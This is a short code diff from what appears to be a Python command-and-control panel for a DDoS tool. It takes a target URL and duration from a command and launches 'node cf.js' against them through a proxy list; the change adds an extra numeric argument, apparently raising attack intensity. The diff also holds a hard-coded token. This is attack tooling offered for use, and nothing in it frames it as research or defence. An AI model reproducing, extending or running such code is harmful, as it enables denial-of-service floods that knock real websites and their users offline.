@@ -962,7 +962,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node cf.js {url} {time} 8 proxies.txt')
+               os.system(f'node cf.js {url} {time} 100 8 proxies.txt')
                 
                url = f"{url}"
                token = "727e8c2fa5b07c"
